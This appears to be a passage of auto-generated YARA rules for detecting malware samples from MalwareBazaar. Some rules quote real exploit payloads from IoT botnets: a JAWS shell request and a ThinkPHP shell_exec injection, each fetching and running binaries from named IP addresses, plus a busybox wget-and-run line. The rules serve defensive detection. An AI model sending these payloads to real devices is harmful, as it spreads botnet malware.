        $s17 = "C:\\Program Files (x86)\\Microsoft Visual Studio\\VB98\\VB6.OLB"
        $s18 = "kernel32.dll"
        $s19 = "GetModuleFileNameA"
        $s20 = "__vbaObjSetAddref"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1386KB and
        all of them
}

rule Linux_325c90abb31eb7cabeca837414f9289a3de1f9abdb715072b22512544a4855ed
{
    meta:
        description = "Auto ML: 325c90abb31eb7cabeca837414f9289a3de1f9abdb715072b22512544a4855ed"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "(wget|curl|grep|pkill|kill|killall)"
        $s4 = "/proc/self/cmdline"
        $s5 = "No such file or directory"
        $s6 = "No such process"
        $s7 = "Interrupted system call"
        $s8 = "Bad file descriptor"
        $s9 = "No child processes"
        $s10 = "Resource temporarily unavailable"
        $s11 = "File exists"
        $s12 = "Too many open files in system"
        $s13 = "Too many open files"
        $s14 = "Text file busy"
        $s15 = "File too large"
        $s16 = "Read-only file system"
        $s17 = "File name too long"
        $s18 = "Level 3 reset"
        $s19 = "Bad font file format"
        $s20 = "Multihop attempted"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 182KB and
        all of them
}

rule Windows_326a9bc3c325f725854d0ec9dac466084a332cb1d5c13b48938f767b3d0c8c33
{
    meta:
        description = "Auto ML: 326a9bc3c325f725854d0ec9dac466084a332cb1d5c13b48938f767b3d0c8c33"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "get_ASCII"
        $s6 = "System.Collections.Generic"
        $s7 = "Thread"
        $s8 = "thread"
        $s9 = "Load"
        $s10 = "set_Enabled"
        $s11 = "set_FormattingEnabled"
        $s12 = "get_InvokeRequired"
        $s13 = "get_Connected"
        $s14 = "set_Sorted"
        $s15 = "set_IsBackground"
        $s16 = "CreateInstance"
        $s17 = "set_AutoScaleMode"
        $s18 = "get_BigEndianUnicode"
        $s19 = "get_Message"
        $s20 = "set_ScrollAlwaysVisible"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 624KB and
        all of them
}

rule Windows_03d64134db5f0c1296f16f64b8ef153fe5096753cb6654de01eaa74e988247dd
{
    meta:
        description = "Auto ML: 03d64134db5f0c1296f16f64b8ef153fe5096753cb6654de01eaa74e988247dd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "Software\\Microsoft\\Windows\\CurrentVersion"
        $s8 = "DeleteFileA"
        $s9 = "FindFirstFileA"
        $s10 = "FindNextFileA"
        $s11 = "FindClose"
        $s12 = "SetFilePointer"
        $s13 = "ReadFile"
        $s14 = "WriteFile"
        $s15 = "GetPrivateProfileStringA"
        $s16 = "WritePrivateProfileStringA"
        $s17 = "GetProcAddress"
        $s18 = "LoadLibraryExA"
        $s19 = "GetModuleHandleA"
        $s20 = "GetExitCodeProcess"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 370KB and
        all of them
}

rule Windows_326f39b2d29896b3748625b4bab991da83ce7583b35dc0ed984455c77f24057b
{
    meta:
        description = "Auto ML: 326f39b2d29896b3748625b4bab991da83ce7583b35dc0ed984455c77f24057b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "GETMANV"
        $s6 = "get_QOBa"
        $s7 = "System.Data"
        $s8 = "System.Collections.Generic"
        $s9 = "add_Load"
        $s10 = "Hopdong_Load"
        $s11 = "DanhSachLuong_Load"
        $s12 = "Vitri_Load"
        $s13 = "PhongBan_Load"
        $s14 = "ThongTinTaiKhoan_Load"
        $s15 = "FormThemNhanVien_Load"
        $s16 = "FormThongTinNhanVienNhanVien_Load"
        $s17 = "ThongTinNhanVien_Load"
        $s18 = "ChucVu_Load"
        $s19 = "get_DarkRed"
        $s20 = "get_Checked"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 801KB and
        all of them
}

rule Linux_32a5c3d673316ed7cca78cbf3bcd9c371510edd426436126700598cf1e3a9d32
{
    meta:
        description = "Auto ML: 32a5c3d673316ed7cca78cbf3bcd9c371510edd426436126700598cf1e3a9d32"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s5 = "Connection: keep-alive"
        $s6 = "GET /shell?cd+/tmp;rm+-rf+*;wget+ 157.90.250.90/jaws;sh+/tmp/jaws HTTP/1.1"
        $s7 = "User-Agent: Hello, world"
        $s8 = "jic|[setme"
        $s9 = ".text"
        $s10 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 72KB and
        all of them
}

rule Windows_32aa4355cbed96bc5f95b9e18425fcfa9e3191007e13e2e6764eb8355f276c8d
{
    meta:
        description = "Auto ML: 32aa4355cbed96bc5f95b9e18425fcfa9e3191007e13e2e6764eb8355f276c8d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB and
        all of them
}

rule Linux_32d24b688b96c95fe5257e96df516d4fd8e5dc95c8749ff03410186f951156e4
{
    meta:
        description = "Auto ML: 32d24b688b96c95fe5257e96df516d4fd8e5dc95c8749ff03410186f951156e4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "connect"
        $s2 = "sigemptyset"
        $s3 = "getpid"
        $s4 = "readlink"
        $s5 = "socket"
        $s6 = "readdir"
        $s7 = "sigaddset"
        $s8 = "setsockopt"
        $s9 = "read"
        $s10 = "memset"
        $s11 = "getppid"
        $s12 = "opendir"
        $s13 = "getsockopt"
        $s14 = "open"
        $s15 = "closedir"
        $s16 = "close"
        $s17 = "getsockname"
        $s18 = "/system"
        $s19 = "/ (deleted)"
        $s20 = "M-SEARCH * HTTP/1.1"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 50KB and
        all of them
}

rule Windows_32e9ea89c598100f7702064c015b2a86ebcc2f3c6c76aba434a63d66a1ca2421
{
    meta:
        description = "Auto ML: 32e9ea89c598100f7702064c015b2a86ebcc2f3c6c76aba434a63d66a1ca2421"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6881KB and
        all of them
}

rule Windows_330aea213247a491354b799ace1111e9436822ec668557e02d0d75e9e7ac1544
{
    meta:
        description = "Auto ML: 330aea213247a491354b799ace1111e9436822ec668557e02d0d75e9e7ac1544"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "GetModuleHandleA"
        $s3 = "GetProcAddress"
        $s4 = "KERNEL32.DLL"
        $s5 = "USER32.dll"
        $s6 = "GetDC"
        $s7 = "comdlg32.dll"
        $s8 = "GetFileTitleA"
        $s9 = "WINSPOOL.DRV"
        $s10 = "ClosePrinter"
        $s11 = "SHELL32.dll"
        $s12 = "SHGetFileInfoA"
        $s13 = "COMCTL32.dll"
    condition:
        uint32(0) == 0x00405a4d and
        filesize < 145KB and
        all of them
}

rule Windows_3370a17c962918d5ae4273b85dc7116750882719a7cb440df9ae75bac995dc36
{
    meta:
        description = "Auto ML: 3370a17c962918d5ae4273b85dc7116750882719a7cb440df9ae75bac995dc36"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".text"
        $s3 = "`.rdata"
        $s4 = ".data"
        $s5 = ".rsrc"
        $s6 = "GetModuleHandleW"
        $s7 = "ExitProcess"
        $s8 = "ResumeThread"
        $s9 = "SuspendThread"
        $s10 = "MapViewOfFile"
        $s11 = "GetFileAttributesA"
        $s12 = "CloseHandle"
        $s13 = "GetComputerNameW"
        $s14 = "GetPriorityClass"
        $s15 = "LoadLibraryA"
        $s16 = "GetSystemTime"
        $s17 = "GetCommandLineW"
        $s18 = "ResetEvent"
        $s19 = "CreateFileMappingA"
        $s20 = "GetPrivateProfileIntA"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 305KB and
        all of them
}

rule Windows_338a704200c126ca6aa4c666bacf257544fe5e1fa10420116b4976de9985d13e
{
    meta:
        description = "Auto ML: 338a704200c126ca6aa4c666bacf257544fe5e1fa10420116b4976de9985d13e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".text"
        $s3 = "`.data"
        $s4 = ".rdata"
        $s5 = "@.rsrc"
        $s6 = "System"
        $s7 = "Create"
        $s8 = "IOffset"
        $s9 = "ImplGetter"
        $s10 = "GetInterface"
        $s11 = "GetInterfaceEntry"
        $s12 = "GetInterfaceTable"
        $s13 = "GetHashCode"
        $s14 = "NewInstance"
        $s15 = "TMonitor.PWaitingThread"
        $s16 = "TMonitor.TWaitingThread"
        $s17 = "Thread"
        $s18 = "FOwningThread"
        $s19 = "SetSpinCount"
        $s20 = "tkSet"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 8837KB and
        all of them
}

rule Windows_33b845f4977885ba03d8de6bc260847dd0ec6dc9489a2da3071701b160a1ddec
{
    meta:
        description = "Auto ML: 33b845f4977885ba03d8de6bc260847dd0ec6dc9489a2da3071701b160a1ddec"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "WORK.exe"
        $s13 = "<Module>"
        $s14 = "Settings"
        $s15 = "ApplicationSettingsBase"
        $s16 = "System.Configuration"
        $s17 = "<Module>{CEA9F617-408A-4D89-BACB-BA3179AD5E3E}"
        $s18 = "<Module>{5e10fd9f-e57e-42a5-94f6-4fcba6ebb315}"
        $s19 = "y3TeBgETN1h0gOhhpvy"
        $s20 = "kernel32"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 331KB and
        all of them
}

rule Windows_33d4fd69c03968b472e3b5ec2fdf43db754aeed4366ae0111ac97fd394ef1e45
{
    meta:
        description = "Auto ML: 33d4fd69c03968b472e3b5ec2fdf43db754aeed4366ae0111ac97fd394ef1e45"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "saveFileDialog1"
        $s5 = "openFileDialog1"
        $s6 = "pageSetupDialog1"
        $s7 = "WindowsApplication1"
        $s8 = "get_IDS_CONNECTION_STRING_32"
        $s9 = "get_IDS_CONNECTION_STRING_64"
        $s10 = "<Module>"
        $s11 = "get_AFX_IDS_PREVIEWPAGEDESC"
        $s12 = "get_AFX_IDS_UNTITLED"
        $s13 = "get_IDB_VIEW_STRIPED"
        $s14 = "get_IDP_AFXBARRES_TEXT_IS_REQUIRED"
        $s15 = "get_ID_EDIT_FIND"
        $s16 = "get_IDM_EDIT_FIND"
        $s17 = "get_ID_EDIT_REPLACE"
        $s18 = "get_IDM_EDIT_REPLACE"
        $s19 = "get_AFX_IDS_OBJ_TITLE_INPLACE"
        $s20 = "get_AFX_IDS_ONEPAGE"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 518KB and
        all of them
}

rule Linux_03fe0c73c91771b3677baf7236a57b27388a7f74caa39845a048f7ba8524078b
{
    meta:
        description = "Auto ML: 03fe0c73c91771b3677baf7236a57b27388a7f74caa39845a048f7ba8524078b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "GET /index.php?s=/index/"
        $s4 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://2.58.113.120/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1"
        $s5 = "User-Agent: Uirusu/2.0"
        $s6 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s7 = "User-Agent: python-requests/2.20.0"
        $s8 = "/bin/busybox wget http://2.58.113.120/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"
        $s9 = ".text"
        $s10 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 79KB and
        all of them
}

rule Windows_33e2197c8f024767830350d957a058e21d21b14574d846b88bc1bae507fc5933
{
    meta:
        description = "Auto ML: 33e2197c8f024767830350d957a058e21d21b14574d846b88bc1bae507fc5933"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<get_Items>b__5_0"
        $s5 = "HashSet`1"
        $s6 = "get_DataTable1"
        $s7 = "get_DataColumn1"
        $s8 = "set_DataColumn1"
        $s9 = "DataSet1"
        $s10 = "<get_Connectors>d__12"
        $s11 = "get_DataColumn2"
        $s12 = "set_DataColumn2"
        $s13 = "<connection>5__3"
        $s14 = "get_DataColumn3"
        $s15 = "set_DataColumn3"
        $s16 = "<Module>"
        $s17 = "System.Drawing.Drawing2D"
        $s18 = "System.IO"
        $s19 = "System.Xml.Schema"
        $s20 = "GetTypedTableSchema"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 984KB and
        all of them
}

rule Linux_33f83de3b8d1ce29956b6e993566886843343408a2601f637a53e9a6310a8155
{
    meta:
        description = "Auto ML: 33f83de3b8d1ce29956b6e993566886843343408a2601f637a53e9a6310a8155"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"
        $s3 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s4 = "PATCH /%s HTTP/1.1"
        $s5 = "User-Agent: %s"
        $s6 = "Connection: close"
        $s7 = "OpenSuse"
        $s8 = "OpenWRT"
        $s9 = "No such file or directory"
        $s10 = "No such process"
        $s11 = "Interrupted system call"
        $s12 = "Bad file descriptor"
        $s13 = "No child processes"
        $s14 = "Resource temporarily unavailable"
        $s15 = "File exists"
        $s16 = "Too many open files in system"
        $s17 = "Too many open files"
        $s18 = "Text file busy"
        $s19 = "File too large"
        $s20 = "Read-only file system"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 92KB and
        all of them
}

rule Windows_341372559158cab79996c90dcd211afda0873d901a0519cc5cbb2e68f52ff410
{
    meta:
        description = "Auto ML: 341372559158cab79996c90dcd211afda0873d901a0519cc5cbb2e68f52ff410"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "`.rdata"
        $s2 = ".rsrc"
        $s3 = "kernel32.dll"
        $s4 = "GetModuleHandleA"
        $s5 = "user32.dll"
        $s6 = "DefWindowProcW"
        $s7 = "advapi32.dll"
        $s8 = "GetUserNameW"
        $s9 = "mscoree.dll"
        $s10 = "shell32.dll"
        $s11 = "comctl32.dll"
        $s12 = "4t$\"/=acMd"
        $s13 = "WINZ"
    condition:
        uint32(0) == 0xbacf5a4d and
        filesize < 7653KB and
        all of them
}

rule Windows_34651d44c15017bddd3fe67dfade46637267be4f3ec660797432f0e23f9b7fab
{
    meta:
        description = "Auto ML: 34651d44c15017bddd3fe67dfade46637267be4f3ec660797432f0e23f9b7fab"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5088KB and
        all of them
}

rule Windows_3477199ac35c44688a69664eb2d722607cff4e3a376a2d066eace87fe016debc
{
    meta:
        description = "Auto ML: 3477199ac35c44688a69664eb2d722607cff4e3a376a2d066eace87fe016debc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SELECT * FROM Win32_OperatingSystem"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetDefaultDllDirectories"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3732KB and
        all of them
}

rule Linux_3480dbc094726ddfe50b81b2afcc03c66c14b0fb8037065224936bd1c5a6af56
{
    meta:
        description = "Auto ML: 3480dbc094726ddfe50b81b2afcc03c66c14b0fb8037065224936bd1c5a6af56"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "<l>=)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 8KB and
        all of them
}

rule Windows_349f7e00ee29b349b00c32318cb9b829b162167702957295712d37ebbb2a7a9a
{
    meta:
        description = "Auto ML: 349f7e00ee29b349b00c32318cb9b829b162167702957295712d37ebbb2a7a9a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "DeleteObject"
        $s6 = "DeleteDC"
        $s7 = "CreateCompatibleDC"
        $s8 = "CreateDIBitmap"
        $s9 = "SetBkMode"
        $s10 = "CreateFontIndirectA"
        $s11 = "GetDeviceCaps"
        $s12 = "CreateFontA"
        $s13 = "CreateSolidBrush"
        $s14 = "GetStockObject"
        $s15 = "GetTextExtentPoint32W"
        $s16 = "SetBkColor"
        $s17 = "SetTextColor"
        $s18 = "SetBrushOrgEx"
        $s19 = "SetTextAlign"
        $s20 = "CreatePatternBrush"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 723KB and
        all of them
}

rule Windows_34a4f512d7c7e37fc580abdc8ca4cce21280e4c33e14c0ca48a0d7aee9fc7db9
{
    meta:
        description = "Auto ML: 34a4f512d7c7e37fc580abdc8ca4cce21280e4c33e14c0ca48a0d7aee9fc7db9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".text"
        $s3 = "`.data"
        $s4 = ".rdata"
        $s5 = "@.rsrc"
        $s6 = "System"
        $s7 = "Create"
        $s8 = "IOffset"
        $s9 = "ImplGetter"
        $s10 = "GetInterface"
        $s11 = "GetInterfaceEntry"
        $s12 = "GetInterfaceTable"
        $s13 = "GetHashCode"
        $s14 = "NewInstance"
        $s15 = "TMonitor.PWaitingThread"
        $s16 = "TMonitor.TWaitingThread"
        $s17 = "Thread"
        $s18 = "FOwningThread"
        $s19 = "SetSpinCount"
        $s20 = "tkSet"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 11324KB and
        all of them
}

rule Windows_34e44036ffb7d1681428bafb62a28fa844dbcb7fad9c79fda98a20f25de94112
{
    meta:
        description = "Auto ML: 34e44036ffb7d1681428bafb62a28fa844dbcb7fad9c79fda98a20f25de94112"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "P`.data"
        $s3 = ".rdata"
        $s4 = "CloseHandle"
        $s5 = "ConnectNamedPipe"
        $s6 = "CreateFileA"
        $s7 = "CreateNamedPipeA"
        $s8 = "CreateThread"
        $s9 = "DeleteCriticalSection"
        $s10 = "GetCurrentProcess"
        $s11 = "GetCurrentProcessId"
        $s12 = "GetCurrentThreadId"
        $s13 = "GetLastError"
        $s14 = "GetModuleHandleA"
        $s15 = "GetProcAddress"
        $s16 = "GetStartupInfoA"
        $s17 = "GetSystemTimeAsFileTime"
        $s18 = "GetTickCount"
        $s19 = "ReadFile"
        $s20 = "RtlVirtualUnwind"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 19KB and
        all of them
}

rule Windows_351fadc9f1ddd2bd6bd34ceed2353b8211123e057b52c6aeb60a28643d92f137
{
    meta:
        description = "Auto ML: 351fadc9f1ddd2bd6bd34ceed2353b8211123e057b52c6aeb60a28643d92f137"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "(SETL"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "System"
        $s7 = "System.Diagnostics"
        $s8 = "System.Reflection"
        $s9 = "System.Runtime.InteropServices"
        $s10 = "AssemblyFileVersionAttribute"
        $s11 = "TargetFrameworkAttribute"
        $s12 = "System.Runtime.Versioning"
        $s13 = "System.Resources"
        $s14 = "free_program_developed_by_students.exe"
        $s15 = "<Module>"
        $s16 = "ThreadSafeObjectProvider`1"
        $s17 = "MySettings"
        $s18 = "ApplicationSettingsBase"
        $s19 = "System.Configuration"
        $s20 = "MySettingsProperty"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5344KB and
        all of them
}

rule Windows_043aa637e4f804322c03ccdccb3f5030c3009b3f3f3da2a6506163007e123674
{
    meta:
        description = "Auto ML: 043aa637e4f804322c03ccdccb3f5030c3009b3f3f3da2a6506163007e123674"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "kernel32.dll"
        $s5 = "comctl32.dll"
        $s6 = "shell32.dll"
        $s7 = "GetCommandLineW"
        $s8 = "GetConsoleCP"
        $s9 = "WriteConsoleW"
        $s10 = "CloseHandle"
        $s11 = "ReadConsoleW"
        $s12 = "SetLastError"
        $s13 = "FlatSB_SetScrollProp"
        $s14 = "ImageList_GetIcon"
        $s15 = "SHGetFolderPathW"
        $s16 = "SHGetDiskFreeSpaceExW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 9598KB and
        all of them
}

rule Windows_356019c5f0ab89bcaff1639b2b2a427d7777fcfa13c09f889ef5ea8eb1c031c7
{
    meta:
        description = "Auto ML: 356019c5f0ab89bcaff1639b2b2a427d7777fcfa13c09f889ef5ea8eb1c031c7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "regex_error(error_complexity): The complexity of an attempted match against a regular expression exceeded a pre-set level."
        $s7 = "GetTempPath2W"
        $s8 = "already connected"
        $s9 = "bad file descriptor"
        $s10 = "connection aborted"
        $s11 = "connection already in progress"
        $s12 = "connection refused"
        $s13 = "connection reset"
        $s14 = "file exists"
        $s15 = "file too large"
        $s16 = "filename too long"
        $s17 = "network reset"
        $s18 = "no child process"
        $s19 = "no such file or directory"
        $s20 = "no such process"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1662KB and
        all of them
}

rule Windows_359834dcc2af3dcbdccb1c13f186c74179a998fe02cbc02afce017c69f717351
{
    meta:
        description = "Auto ML: 359834dcc2af3dcbdccb1c13f186c74179a998fe02cbc02afce017c69f717351"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "get_Nota1"
        $s5 = "set_Nota1"
        $s6 = "get_Nota2"
        $s7 = "set_Nota2"
        $s8 = "<Module>"
        $s9 = "get_OBZHA"
        $s10 = "CSUST.Data"
        $s11 = "get_KeyData"
        $s12 = "System.Collections.Generic"
        $s13 = "get_CurrentThread"
        $s14 = "Form1_Load"
        $s15 = "add_Load"
        $s16 = "get_EditingControlValueChanged"
        $s17 = "set_EditingControlValueChanged"
        $s18 = "set_Handled"
        $s19 = "get_IsDisposed"
        $s20 = "get_Focused"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 695KB and
        all of them
}

rule Windows_35a0972ce46d230c9d81041386f11c361f799591fcc278ec9f11d5140aa5389a
{
    meta:
        description = "Auto ML: 35a0972ce46d230c9d81041386f11c361f799591fcc278ec9f11d5140aa5389a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "delete"
        $s7 = "delete[]"
        $s8 = "`placement delete closure'"
        $s9 = "`placement delete[] closure'"
        $s10 = "`local static thread guard'"
